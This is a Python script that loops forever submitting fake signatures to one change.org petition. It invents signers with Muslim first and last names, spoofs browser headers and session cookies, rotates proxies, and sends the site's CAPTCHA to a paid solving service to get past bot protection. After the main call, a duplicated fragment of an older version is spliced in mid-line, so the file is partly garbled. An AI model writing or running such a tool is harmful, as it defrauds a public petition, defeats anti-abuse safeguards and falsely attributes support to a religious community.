import aiohttp
import asyncio
import random
from faker import Faker
import aiohttp_socks
from twocaptcha import TwoCaptcha

fake = Faker('en_IN')
muslim_names = {
    'first': ['Mohammed', 'Fatima', 'Yusuf', 'Aisha', 'Ahmed', 'Zainab'],
    'last': ['Qureshi', 'Khan', 'Siddiqui', 'Hussain', 'Ali', 'Rahman']
}
proxies = ['socks5://proxy1:port', 'socks5://proxy2:port']  # Replace with actual proxy list
solver = TwoCaptcha('YOUR_2CAPTCHA_API_KEY')  # Replace with your 2Captcha API key

async def solve_captcha(captcha_url):
    result = solver.normal(captcha_url)  # Solve PerimeterX CAPTCHA
    return result['code']

async def send_request(session, payload, proxy):
    headers = {
        'Host': 'www.change.org',
        'content-type': 'application/json',
        'x-requested-with': 'corgi-front-end-browser:5.446.0',
        'user-agent': fake.user_agent(),
        'accept': 'application/json',
        'origin': 'https://www.change.org',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'cookie': f'_change_session={fake.uuid4()}; _ga=GA1.2.{random.randint(1000000000, 9999999999)}.{random.randint(1000000000, 9999999999)}'
    }
    try:
        async with session.post(
            'https://www.change.org/api-proxy/graphql/signPetition/490796050?op=SignatureSharedCreateSignature',
            json=payload, headers=headers, proxy=proxy
        ) as response:
            if response.content_type == 'application/json':
                return await response.json(), None
            else:
                html_content = await response.text()
                if 'PXNsLC0Hv5/captcha' in html_content:
                    captcha_url = response.json().get('blockScript', '')
                    captcha_token = await solve_captcha(captcha_url)
                    return None, captcha_token
                return None, None
    except Exception as e:
        print(f"Error: {e}")
        return None, None

async def main():
    async with aiohttp.ClientSession() as session:
        while True:  # Infinite loop for unlimited requests
            payload = {
                "operationName": "SignatureSharedCreateSignature",
                "variables": {
                    "shouldRewardShareBandit": False,
                    "rewardShareBanditInput": {"banditId": "", "variantName": ""},
                    "signatureInput": {
                        "petitionId": "490796050",
                        "pageContext": "petitions_show",
                        "trafficMetadata": {"currentSource": "share_petition", "currentMedium": "copylink", "referringDomain": None},
                        "isMobile": True,
                        "firstName": random.choice(muslim_names['first']),
                        "lastName": random.choice(muslim_names['last']),
                        "email": fake.email(),
                        "city": fake.city(),
                        "countryCode": "IN",
                        "postalCode": fake.postcode(),
                        "public": True,
                        "apiVersion": 2,
                        "recaptchaResponse": None
                    }
                },
                "extensions": {
                    "clientLibrary": {"name": "@apollo/client", "version": "4.0.5"},
                    "webappInfo": {"name": "corgi", "build_ts_utc": "2025-09-25T13:16:13.676Z", "version": "5.446.0", "version_normalized": "0005.0446.0000", "ssr": False},
                    "operationId": "mfzm2b4ps1hl3u2465"
                }
            }
            proxy = random.choice(proxies)
            response, captcha_token = await send_request(session, payload, proxy)
            if captcha_token:
                payload['variables']['signatureInput']['recaptchaResponse'] = captcha_token
                response, _ = await send_request(session, payload, proxy)
            print(f"Response received: {response}")
            await asyncio.sleep(1.0)  # One-second delay between requests

asyncio.run(main())                        "pageContext": "petitions_show",
                        "trafficMetadata": {"currentSource": "share_petition", "currentMedium": "copylink", "referringDomain": None},
                        "isMobile": True,
                        "firstName": random.choice(muslim_names['first']),
                        "lastName": random.choice(muslim_names['last']),
                        "email": fake.email(),
                        "city": fake.city(),
                        "countryCode": "IN",
                        "postalCode": fake.postcode(),
                        "public": True,
                        "apiVersion": 2
                    }
                },
                "extensions": {
                    "clientLibrary": {"name": "@apollo/client", "version": "4.0.5"},
                    "webappInfo": {"name": "corgi", "build_ts_utc": "2025-09-25T13:16:13.676Z", "version": "5.446.0", "version_normalized": "0005.0446.0000", "ssr": False},
                    "operationId": "mfzm2b4ps1hl3u2465"
                }
            }
            response = await send_request(session, payload)
            print(f"Response received: {response}")
            await asyncio.sleep(random.uniform(0.1, 0.5))  # Random delay to mimic human behavior
asyncio.run(main())
